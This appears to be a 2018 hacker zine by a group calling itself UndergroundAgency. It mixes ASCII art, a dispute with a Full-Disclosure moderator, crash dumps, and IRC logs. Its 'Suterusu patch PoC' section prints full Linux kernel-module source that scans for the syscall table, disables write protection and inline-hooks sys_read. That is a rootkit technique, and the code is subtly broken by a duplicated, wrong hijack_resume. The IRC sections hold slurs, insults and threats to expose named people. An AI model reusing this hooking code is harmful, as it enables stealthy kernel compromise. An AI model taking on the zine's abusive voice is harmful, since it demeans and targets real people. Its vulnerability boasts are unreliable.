@@ -1,0 +1,845 @@
+  .--.-.
+ ( (    )__ 
+(_,  \ ) ,_)
+  '- \\---'
+     _\\ ~ua
+    \\ .
+    '.\:.'
+    .':`(\
+      '  \\ skids
+          \\
+           \\
+            \\
+             \\
+              \\
+               \\  _
+                \\/@)
+                /(&\
+               (@(\&\       <*****> 
+                ` \/ \.=^=.  .""".  .=^=.
+                   \  \```\\(/x x\)//```\\
+                    \  \    (  L  )      }}
+                    {\  \ __ \ = /       }} -dead
+                    {{\  '--,/'-'\,---.  }}
+                    {{ \ |`-._/\_.-'|  \ }}
+                    {{  \|    ||    |\  \}}
+                    {{   |___o()o___| >  )}
+                    {{   |__((<>))__|` .'}}
+                    {{   \   o\/o   /``  }}
+                    {{  ,'\   ||   / ',  }}
+                    {{.'   \  ||  /|   '.}}
+                           |'.||.' |
+                           |    :  |
+                           |    :  |
+                           |    :  |
+                           |    :  |
+                           |    :  |
+                           |    :  |
+                           |____:__|
+                            (_/ \_)
+
+"And we're very, very pissed off. The first rule of Fight Club is: You do not talk about Fight Club.
+The second rule of Fight Club is: You do not talk about Fight Club. Third rule of Fight Club: someone
+yells stop, goes limp, taps out, the fight is over". > The Reb1r7h.
+
+
+\\ ** || 0x00 The halls of lest || ** //
+
+----------------------------|```````````````````````````````````````\\```````````````\\````````````//`````````````\\````[]``````````\``````````````````.
+|Enoch 39:4 There I saw another vision; I saw the habitations and resting places of the saints. There my eyes beheld their habitations with the angels,
+| and their resting places with the holy ones. They were entreating, supplicating, and praying for the sons of men; while righteousness like water flowed
+| before them, and mercy like dew was scattered over the earth. And thus shall it be with them for ever and for ever.â€//////////////////////////////////////
+_
+
+
+--		--		--		--
+
+Table Of Contents;
+
+0x00 The halls of lest
+0x01 registrar_redpill[0].txt
+0x02 ~UA vs FD
+0x03 Suterusu patch PoC
+0x04 0dayz
+0x05 sk1dz gal0r3
+0x06 gr33tz / outro
+
+--		--		--		--
+
+
+
+           ____                      ,
+          /---.'.__             ____//
+               '--.\           /.---'
+          _______  \\         //
+        /.------.\  \|      .'/  ______
+       //  ___  \ \ ||/|\  //  _/_----.\__
+      |/  /.-.\  \ \:|< >|// _/.'..\   '--'
+         //   \'. | \'.|.'/ /_/ /  \\
+        //     \ \_\/" ' ~\-'.-'    \\
+       //       '-._| :H: |'-.__     \\  ~cr4wl1ng
+      //           (/'==='\)'-._\     ||
+      ||                        \\    \|
+      ||                         \\    '
+      |/                          \\
+                                   ||
+                                   ||
+                                   \\
+                                    '
+
+
+0x01; th3_cr4wL ; k33p th17 in m1nd, ascr1b3 4LL Pur17y..
+
+(icann.org removes all their ns / txt records lolol ; 4/6/2018 ; gave away ranges exposed before to different ircd's)
+joe@ubuntu:~$ dig icann.org any
+
+; <<>> DiG 9.10.3-P4-Ubuntu <<>> icann.org any
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 36570
+;; flags: qr rd ra: QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
+
+;; OPT PSEUDOSECTION
+; EDNS: version: 0, flags:; udp: 65494
+;; QUESTION SECTION:
+;icann.org.			IN	ANY
+
+;; Query time: 688 msec
+;; Server: 127.0.0.53#53(127.0.0.53)
+;; WHEN: Fri Apr 06 13:14:52 CDT 2018
+;; MSG SIZE  rcvd: 38
+
+\\** ^ original icann.org ranges found elsewhere ;PpPpP **//
+
+199.122.123.250/32 199.122.124.194/32  (Pm Zodiac from irc.xmpp.land/6697 #security about that lost mail.equifax.com:80 backdoor..)
+
+(aspmx.googlemail.com servers.mcsv.net mail.zendesk.com --> ip4:69.64.159.23/32) --> yeah, definitely should patch...
+
+--		--		--		--
+
+0x02; ~UA vs FD /// A disgruntled full-disclosure staff member named Matthew Fernandez; our argument upon ~ua's double-free bypass bug ;D
+    Reference(s): https://raw.githubusercontent.com/undergroundagency/disclosure/master/satirical_analysis.txt
+
+http://seclists.org/fulldisclosure/2018/Mar/70 (mirror)
+
+----
+From: Matthew Fernandez <matthew.fernandex() gmail.com>
+Date: Tue, 27 Mar 2018 12:06:59-0700
+
+Maybe I'm misunderstanding something, but what is the vulnerability here? It looks like you are just demonstrating that
+a program can corrupt its own heap, which it can already do in numerous other ways.
+
+BEGIN_EMAIL_FEED(){
+<<** // Full-disclosure moderator Matthew Fernandez getting passive-aggressive after ~UA proves double-free bypass bug exists \\ **>>
+
+Matthew Fernandez <matthew.fernandez@gmail.com>
+27 Mar (10 days ago)
+to me, fulldisclosure 
+Maybe I am misunderstanding something, but what is the vulnerability here? It looks like you are just demonstrating that a program can corrupt its own heap, which it can already do in numerous other ways.
+> _______________________________________________
+> Sent through the Full Disclosure mailing list
+> https://nmap.org/mailman/listinfo/fulldisclosure
+> Web Archives & RSS: http://seclists.org/fulldisclosure/
+
+keliikoa kirland <keliikoakirland@gmail.com>
+5 Apr (1 day ago)
+to Matthew 
+Hey I'm back ;PpPpP
+It's an actual mmap() bug, https://github.com/torvalds/linux/blob/master/mm/mmap.c#L212
+
+	/*
+	 * Check against rlimit here. If this check is done later after the test
+	 * of oldbrk with newbrk then it can escape the test and let the data
+	 * segment grow beyond its set limit the in case where the limit is
+	 * not page aligned -Ram Gupta
+	 */
+	if (check_data_rlimit(rlimit(RLIMIT_DATA), brk, mm->start_brk,
+			      mm->end_data, mm->start_data))
+		goto out;
+
+	newbrk = PAGE_ALIGN(brk);
+	oldbrk = PAGE_ALIGN(mm->brk);
+	if (oldbrk == newbrk)
+		goto set_brk;
+
+
+albeit.
+
+
+fulldisclosure-owner@seclists.org
+10:59 (1 hour ago)
+to me 
+Your request to the Fulldisclosure mailing list
+
+    Posting of your message titled "In response to Matthew Fernandez
+<matthew.fernandex@gmail.com> Double-free() bypass"
+
+has been rejected by the list moderator.  The moderator gave the
+following reason for rejecting your request:
+
+"It's not clear what you are demonstrating here.  The comment says
+they need to have rlimit check before the oldbrk test and they do. It
+looks like the comment and the test have been there for years, so they
+didn't just add this as a fix.  You may be right about there being a    <--- lol
+bug, but perhaps you can resend this to the list but with more clarity    <---- lol
+as to what it is so the listmembers better understand what you're
+saying?  Thanks!"
+
+Any questions or comments should be directed to the list administrator
+at:
+
+    fulldisclosure-owner@seclists.org
+
+
+keliikoa kirland <keliikoakirland@gmail.com>
+12:47 (4 minutes ago)
+to fulldisclosure. 
+Eh? That's exactly what I was trying to exclaim; albeit,  "It
+looks like the comment and the test have been there for years, so they
+didn't just add this as a fix." That's the bug Matthew; self-explanatory, thanks.
+}
+
+--		--		--		--
+
+
+
+                    \`\
+                     \ \
+                      \ \
+                       \ \
+                        \.\
+                         \.\
+                          \.\  
+                 _         \.\/)
+            _ _-' ')__     (\.\/)
+           /       /  \.'`'-\/)\\
+           \__ ,.-'(_  Y    (_\.\)
+            / < o O \  \    ,\\.\\
+            \_ \ _. /y(_|    : |\.\|
+             _\_\\   |    : | \.\
+            (   `'-._>/ )     \|  \.\
+            \         `:=.    (\   \.\
+             \_      (    `--._)`--'\.\=7
+            _/|\_    \-._     `-:_ /```-3    
+           /  |  `-   \  t--._    Y    _3 
+        ,-'   |       /  |   /``'-.\--T x\
+      _/     _(    ,./  /   (          \ x\
+         _.-/  \  /    <     \          \ x\
+      <`'  /   |\/      `-.   :          \_x\
+       \  /    |           `. |
+        \_|    /             `.
+          |   /                `.
+         /  _/\                /
+
+
+
+0x03; Suterusu patch PoC; A patch / technique for detecting Suterusu / inline-hooked LKM rootkits..
+  Reference(s): https://raw.githubusercontent.com/undergroundagency/ua/master/suterusu_patch_poc.txt
+
+\\ ** Tested on.. ** //
+
+LSD_RELEASE: Ubuntu 12.04 LTS
+Kernel: 3.2.0-23-generic (the_end_of_d4yzzz...)
+ARCH: x86_64
+
+--
+
+\\** Makefile 'z **//
+obj-m += blah.o
+
+all:
+    sudo make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+    sudo make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+--
+
+obj-m += blah2.o
+
+all:
+    sudo make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+    sudo make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+--
+
+\\** EoS.txt End_of_Sin.txt **//
+-- -- -- -- -- -- -- -- -- -- --
+
+// Suterusu patch / detection via double_fault()
+
+// step-by-step (2 LKM'z)
+// - $ make (blah.o)
+// - $ sudo insmod ./blah.ko
+// - $ make (blah2.o)
+// - $ sudo insmod ./blah2.ko
+
+--
+
+Result (sh17 th4t m4tt3rz..):
+Call Trace:
+[13702.987626] [<ffffffff81014302>] do_double_fault+0x72/0x80
+[13702.987860] [<ffffffff81666ab5>] double_fault+0x25/0x30
+
+[13702.989334] RIP [<ffffffff81056622>] update_curr+0x42/0x230
+
+////////////////\\\\\\\\\\\\\\\\\\\\
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/slab.h>
+#include <linux/syscalls.h>
+#include <asm/uaccess.h>
+
+// macros
+#define HIJACK_SIZE 12
+/////////////////////////////////
+
+struct sym_hook{
+    void *addr;
+    unsigned char o_code[HIJACK_SIZE];
+    unsigned char n_code[HIJACK_SIZE];
+    struct list_head list;
+};
+
+LIST_HEAD(hooked_syms);
+
+/////////////////////////////////
+
+// globals
+unsigned long **sys_call_table;
+//////////////////////
+
+// prototypes
+/////////////////////////////
+
+void hijack_start(void *target, void *new);
+void hijack_pause(void *target);
+void hijack_resume(void *target);
+void hijack_stop(void *target);
+
+asmlinkage long (*original_sys_read)(unsigned int fd, char __user *buf, size_t count);
+//////////////////////////////////////////
+
+// functions
+//////////////////////
+
+inline unsigned long disable_wp(void){
+    unsigned long cr0;
+
+    preempt_disable();
+    barrier();
+
+    cr0 = read_cr0();
+    write_cr0(cr0 & ~X86_CR0_WP);
+
+    return cr0;
+}
+
+inline void restore_wp(unsigned long cr0){
+    write_cr0(cr0);
+
+    barrier();
+    preempt_enable();
+}
+
+void hijack_start(void *target, void *new){
+    struct sym_hook *sa;
+    unsigned char o_code[HIJACK_SIZE], n_code[HIJACK_SIZE];
+
+    unsigned long o_cr0;
+
+    // mov rax, $addr; jmp rax
+    memcpy(n_code, "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0", HIJACK_SIZE);
+    *(unsigned long *)&n_code[2] = (unsigned long)new;
+
+    printk(KERN_INFO "Hooking function with 0x%p with 0x%p\n", target, new);
+
+    memcpy(o_code, target, HIJACK_SIZE);
+    o_cr0 = disable_wp();
+    memcpy(target, n_code, HIJACK_SIZE);
+    restore_wp(o_cr0);
+
+    sa = kmalloc(sizeof(*sa), GFP_KERNEL);
+    if(!sa)
+        return;
+
+    sa->addr = target;
+    memcpy(sa->o_code, o_code, HIJACK_SIZE);
+    memcpy(sa->n_code, n_code, HIJACK_SIZE);
+
+    list_add(&sa->list, &hooked_syms);
+}
+
+void hijack_pause(void *target){
+    struct sym_hook *sa;
+
+    list_for_each_entry(sa, &hooked_syms, list){
+        if(target == sa->addr){
+            unsigned long o_cr0 = disable_wp();
+            memcpy(target, sa->o_code, HIJACK_SIZE);
+            restore_wp(o_cr0);
+        }
+    }
+}
+
+void hijack_resume(void *target){
+    struct sym_hook *sa;
+
+    list_for_each_entry(sa, &hooked_syms, list){
+        if(target == sa->addr){
+            unsigned long o_cr0 = disable_wp();
+            memcpy(target, sa->o_code, HIJACK_SIZE);
+            restore_wp(o_cr0);
+        }
+    }
+}
+
+void hijack_resume(void *target){
+    struct sym_hook *sa;
+
+    list_for_each_entry(sa, &hooked_syms, list){
+        if(target == sa->addr){
+            unsigned long o_cr0 = disable_wp();
+            memcpy(target, sa->n_code, HIJACK_SIZE);
+            restore_wp(o_cr0);
+        }
+    }
+}
+
+void hijack_stop(void *target){
+    struct sym_hook *sa;
+    printk(KERN_INFO "Unhooking function 0x%p\n", target);
+
+    list_for_each_entry(sa, &hooked_syms, list){
+        if(target == sa->addr){
+            unsigned long o_cr0 = disable_wp();
+            memcpy(target, sa->o_code, HIJACK_SIZE);
+            restore_wp(o_cr0);
+
+            list_del(&sa->list);
+            kfree(sa);
+            break;
+        }
+    }
+}
+
+static unsigned long **acquire_sys_call_table(void){
+    unsigned long int offset = PAGE_OFFSET;
+    unsigned long **sct;
+
+    printk(KERN_INFO "Starting syscall table scan from: %lx\n", offset);
+    while(offset < ULLONG_MAX){
+        sct = (unsigned long **)offset;
+
+        if(sct[__NR_close] == (unsigned long *)sys_close){
+            printk(KERN_INFO "syscall table found at: %lx\n", offset);
+            return sct;
+        }
+
+        offset += sizeof(void *);
+    }
+
+    return NULL;
+}
+
+asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count){
+    long ret;
+
+    printk(KERN_INFO "sys_read() hooked!#$%%\n");
+
+    hijack_pause(original_sys_read);
+    ret = original_sys_read(fd, buf, count);
+    hijack_resume(original_sys_read);
+
+    return ret;
+}
+
+/////////////////////////////////
+
+int init_module(void){
+    printk(KERN_INFO "Hello\n");
+
+    sys_call_table = acquire_sys_call_table();
+
+    original_sys_read = (void *)sys_call_table[__NR_read];
+    hijack_start(original_sys_read, &new_sys_read);
+
+    return 0;
+}
+
+void cleanup_module(void){
+    printk(KERN_INFO "goodbye\n");
+    hijack_stop(original_sys_read);
+}
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("UndergroundAgency");
+
+--		--		--		--
+
+
+               ,-._,-._             .----------------------------------.
+            _,-\  o O_/;            | 	All 			       |
+           / ,  `     `|            |       of     		       |
+           | \-.,___,  /   `        |         your    0dayz!!          |
+            \ `-.__/  /    ,.\      `----------------------------------'
+           / `-.__.-\`   ./   \'
+          / /|    ___\ ,/      `\
+         ( ( |.-"`   '/\         \  `
+          \ \/      ,,  |          \ _
+           \|     o/o   /           \.
+            \        , /             /
+            ( __`;-;'__`)            \\
+            `//'`   `||`              `\
+           _//       ||                ;
+   .-"-._,(__)     .(__).-""-.         `
+  /          \    /           \       '
+  \          /    \           /        `
+   `'-------`      `--------'`         ;
+					'
+0x04; 0dayz    	                       `'
+					;
+
+--  --  --  --  --  --
+
+
+\* h3xch4t iz th3 b3st, r4n 1t as r00t */
+
+// n1c3 0v3rf10w b1tch3z
+
+(((((((((( hexchat[30394]: segfault at 7f0ca6862199 ip 00007f0ca67a5993 sp 00007ffd83fab310 error 4 in libpcre.so.3.13.3[7f0ca678b000+70000] ))))))))))
+
+*someone flooded Supernets with ascii etc, then their client crashed >> L0L! >>> 0v3rf10w
+
+--  --  --  --  --  --
+
+* Now talking on #superbowl
+* Topic for #superbowl is: < koa> fuck wormsec | 1 BTC BOUNTY FOR KOA FULL DOX | [02:48:40 ][  koa ] yup, watch the zine time | [02:48:48 ][  koa ] it's gonna feature u!
+* Topic for #superbowl set by pyrex (Mon Apr  9 19:50:33 2018)
+<MIKEJONEZ> bruh
+<MIKEJONEZ> wb
+<MIKEJONEZ> koa: 
+<koa> thanks
+<MIKEJONEZ> np
+<MIKEJONEZ> mist u
+<koa> ik, what u up to
+<MIKEJONEZ> rollin a spliff
+<MIKEJONEZ> with some kush
+<MIKEJONEZ> bout 2 smoke it
+<MIKEJONEZ> u
+<MIKEJONEZ> hows that zine?
+<MIKEJONEZ> coming along
+<MIKEJONEZ> i could help u
+<MIKEJONEZ> if u want
+<MIKEJONEZ> with it
+<koa> it's done, waiting on solar
+<MIKEJONEZ> nice zine
+<MIKEJONEZ> whens the 
+<koa> what do u mean
+<MIKEJONEZ> release
+<koa> are u trolling again
+<MIKEJONEZ> what
+<MIKEJONEZ> nigga
+<MIKEJONEZ> link 2 zine
+<MIKEJONEZ>  . . . 
+<koa> >it's done, waiting on solar; 0x04 0dayz ft. solar
+<MIKEJONEZ> link
+<koa> unless he doesn't pull through, been a while since i heard back()
+<koa> link 2 what, the first one?
+<MIKEJONEZ> me feature
+<MIKEJONEZ> link 2 it
+<MIKEJONEZ> i like 2 read about myself
+<MIKEJONEZ> and then jerk off
+<koa> you're not getting featured, ik u were trolling so i got rid of logs
+<MIKEJONEZ> while reading
+<MIKEJONEZ>                             %% what
+<koa> yeah, im not going to shit on you, it's ok
+<MIKEJONEZ> this is 2 goofy, lemme go smoke this spliff
+<MIKEJONEZ> ill brb in a min
+<MIKEJONEZ> dont emo quit
+<MIKEJONEZ> faggot
+<pyrex> %%'d
+<MIKEJONEZ>  ok
+<MIKEJONEZ>  ok
+<MIKEJONEZ>  ok
+<MIKEJONEZ>  ok
+<MIKEJONEZ> smoked
+<MIKEJONEZ> half of it
+<pyrex> ok
+<MIKEJONEZ> kept laughing
+<MIKEJONEZ> at this
+<MIKEJONEZ> convo
+<MIKEJONEZ> in me head
+<MIKEJONEZ> koa: u there
+<MIKEJONEZ> koa: i heard u
+<koa> yeah
+<MIKEJONEZ> 1> cant chat
+<MIKEJONEZ> 2> cant hack
+<MIKEJONEZ> 3> cant flood
+<MIKEJONEZ> 4> cant packet
+<MIKEJONEZ> 5> dont have a sex life
+<MIKEJONEZ> 6> are fat irl
+<MIKEJONEZ> 7> doesnt have alot of sex
+<MIKEJONEZ> (pause)
+<MIKEJONEZ> can u 
+<MIKEJONEZ> confirm
+<MIKEJONEZ> or deny
+<MIKEJONEZ> these
+<MIKEJONEZ> alligations
+<MIKEJONEZ> which
+<MIKEJONEZ> are
+<MIKEJONEZ> being
+<MIKEJONEZ> stated
+<MIKEJONEZ> by
+<MIKEJONEZ> the
+<MIKEJONEZ> chat
+<MIKEJONEZ> god
+<MIKEJONEZ> <-----------------------
+<MIKEJONEZ> (pause)
+<MIKEJONEZ>  (pause)
+<koa> You're just a chatter MIKEJONEZ, gg.  <-- karma, now you're getting zine'd faggot ;PpPP
+
+--  --  --  --  --  --
+
+Reference(s): https://raw.githubusercontent.com/undergroundagency/ua/master/unicode_bash_bug.txt
+
+\\ ** SURROGATES N0T ALL0W3D !!%%#@ **/
+
+joe@ubuntu:~$ `echo -e "\xcc";`
+Sorry, command-not-found crashed! Please file a bug report at:
+https://bugs.launchpad.net/command-not-found/+filebug
+Please include the following information with the report:
+
+command-not-found version: 0.3
+Python version: 3.4.3 final 0
+Description: Ubuntu 14.04.5 LTS
+Release:	 14.04
+Codename:    trusty
+Exception information:
+
+'utf-8' codec can't encode character '\udccc' in position 0: surrogates not allowed
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/CommandNotFound/util.py", line 24, in crash_guard
+    callback()
+  File "/usr/lib/command-not-found", line 90, in main
+    if not cnf.advise(args[0], options.ignore_installed) and not options.no_failure_msg:
+  File "/usr/lib/python3/dist-packages/CommandNotFound/CommandNotFound.py", line 265, in advise
+    packages = self.getPackages(command)
+  File "/usr/lib/python3/dist-packages/CommandNotFound/CommandNotFound.py", line 157, in getPackages
+    result.update([(pkg, db.component) for pkg in db.lookup(command)])
+  File "/usr/lib/python3/dist-packages/CommandNotFound/CommandNotFound.py", line 85, in lookup
+    result = self.db.lookup(command)
+  File "/usr/lib/python3/dist-packages/CommandNotFound/CommandNotFound.py", line 41, in lookup
+    key = key.encode('utf-8')
+UnicodeEncodeError: 'utf-8' codec can't encode character '\udccc' in position 0: surrogates not allowed
+
+joe@ubuntu:~$ uname -a
+Linux ubuntu 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+
+--		--		--		--
+
+ 				  
+                              /^\  ~ua
+           L L               /   \               L L
+        __/|/|_             /  .  \             _|\|\__
+       /_| [_[_\           /     .-\           /_]_] |_\
+      /__\  __`-\_____    /    .    \    _____/-`__  /__\
+     /___] /=@>  _   {>  /-.         \  <}   _  <@=\ [___\
+    /____/     /` `--/  /      .      \  \--` `\     \____\   
+   /____/  \____/`-._> /               \ <_.-`\____/  \____\
+  /____/    /__/      /-._     .   _.-  \      \__\    \____\
+ /____/    /__/      /         .         \      \__\    \____\
+|____/_  _/__/      /          .          \      \__\_  _\____|
+ \__/_ ``_|_/      /      -._  .        _.-\      \_|_`` _\___/
+   /__`-`__\      <_         `-;           _>      /__`-`__\
+      `-`           `-._       ;       _.-`           `-`
+                        `-._   ;   _.-`
+                            `-._.-` skidz()
+
+
+
+
+0x05; sk1dz g4l0r3
+
+/ empty threats and a house of lies
+// h1nt h1nt; merkii aka @xFBIz cann0t h4ck! (n0t a surpr1se)
+
+
+<koa> who dis
+
+ 
+<MerKii> i need to know this
+<MerKii> okay, so ur the real AB members?
+
+<koa> no, just me
+<koa> other 2 members are friends
+
+<MerKii> are u intel?
+
+<koa> no
+
+<MerKii> are u koa?
+
+<koa> yeah
+<koa> ac1db1tch3z koa
+<koa> double-free() bypass buf
+<koa> bug*
+<koa> on FD
+
+<MerKii> but aren't u guys trolling MLT?         <-- autism 
+
+<koa> no, im cool with them now
+<koa> @insecurity albeit
+<koa> chillin in their group chat etc
+
+<MerKii> i was in insec too (:          <-- real hacker guyz
+<MerKii> matteo created the @ group
+
+<koa> nerfnet, u, z, matteo
+<koa> haven't done shit
+<koa> for ua
+
+<MerKii> they left
+
+<koa> they couldn't do shit even if they tried
+
+<MerKii> cuz uno
+<MerKii> uni
+
+<koa> tell nerfnet he's a joke
+<koa> tell matteo he's a joke
+<koa> know that you're a joke
+<koa> and that your discord is a joke
+<koa> and that you're a skid
+<koa> including matteo, z, nerfnet, etc
+
+<MerKii> no shit my @ discord is a joke
+
+<koa> gg
+
+ 
+<MerKii> why are u mad?
+<MerKii> at @ me
+
+<koa> im not, im just astonished / elated that i get to zine all of you now
+<koa> thanks for the logs
+<koa> ;pPpPP
+
+<MerKii> kEk
+<MerKii> make sure to link it (:
+
+<koa> i will
+<koa> u idiot
+<koa> lol
+<koa> tell matteo to suck a dick
+<koa> you faggot
+<koa> ;)
+
+<MerKii> u can also get a zine to make u look @ retarded    << here we have a hacker saying we will get zine'd!
+<MerKii> by matteo
+<MerKii> Since he's intellectually superior to all of @ u
+<MerKii> even though he can't hack
+
+<koa> sure
+<koa> we're so scared
+<koa> are u like, the spokesperson for the skid community or something
+<koa> btw, the more u respond, the more i log for next zine
+<koa> so please keep talking
+<koa> you will get featured on FD, and other skids will laugh at you once more
+<koa> did u google my email yet u little harmless fairy?
+
+<MerKii> well now everyone knows that ur not AB so
+<MerKii> i'll tell MLT then
+
+<koa> how?
+<koa> you're all retarded teenage skids lol
+<koa> do u think i care that harmless skids like yourself
+
+<MerKii> prove it s1r
+
+<koa> tell people
+<koa> that im not ab
+<koa> lol
+
+<koa> i did     <--- in reference to "<MerKii> prove it s1r"
+
+<MerKii> u haven't proved anything s1r
+
+<koa> google keliikoakirland@gmail.com
+<koa> you autistic moron
+<koa> seclists_dot_org/fulldisclosure/2018/Mar/63
+<koa> now guess what
+<koa> since i just proved everything
+<koa> you're all gonna get zine'd ; 0x05 skidz galore
+ 
+<MerKii> that makes me happy;
+
+<koa> good
+<koa> ;)
+
+<MerKii> (:
+<MerKii> make sure to link it (:
+
+<koa> i will
+<koa> u idiot
+<koa> lol
+<koa> tell matteo to suck a dick
+<koa> you faggot
+<koa> ;)
+
+<MerKii> Matteo, brett && z started the group
+
+<koa> no, i came up with the name UndergroundAgency with gasipp
+<koa> they were in the same discord, moron
+<koa> and that's getting logged; what u said
+<koa> for my own personal schadenfreude, once more
+
+<MerKii> good :))
+
+<koa> keep shooting yourself in the foot skid boy
+<koa> you harmless joke
+<koa> ;)
+<koa> glad u know how harmless all of u are now
+
+--		--		--		--
+
+\\** TH3 H4LL 0F F4M33 %% #@! )( **//
+-------- -------- -------- --------
+/////////////////\\\\\\\\\\\\\\\\\\\
+
+0x06; gr33tz / outr0
+
+  mlt, @insecurity, @ut_infection, GOBBLES, zf0, h0n0, ab, ~CAPZLOCKED, phc, ~el8, 2l8, ap, t3kn10n, vl4d1m1r, NTITTION, GoD, tun3, etc
+
+  irc.supernets.org/6697 #ua #superbowl #scroll
+
+  @x0r1_ua, @pthread_create, @pthread_exit
+
+  "
+
+--		--		--		--
+
+		
+				
+
+                               ___------~~~~~~~~~~~----__         .:.         __----~~~~~~~~~~~------___
+			     ~~ ~--__          ......====\\~~    .:::.    ~~//====......          __--~ ~~
+       			             ~\ ...::::~~~~~~  //|||    .:::::.    |||\\  ~~~~~~::::... /~
+       			            -~~\_            //  |||***.(:::::).***|||  \\            _/~~-
+             			         ~\_        // *******.:|\^^^/|:.******* \\        _/~
+               			            \      / ********.::(>: :<)::.******** \      /
+      	       		                     \   /  ********.::::\\|//::::.********  \   /
+   			                      \ /   *******.:::::(o o):::::.*******   \ /
+                 			       /.   ******.::::'*|V_V|***`::.******   .\
+                    				 ~~--****.:::'***|___|*****`:.****--~~
+                        			       *.::'***//|___|\\*****`.* 
+                           			       .:'  **/##|___|##\**    .
+                        			      .    (v(VVV)___(VVV)v)
+
+
+
+EOF
+~ua 2018
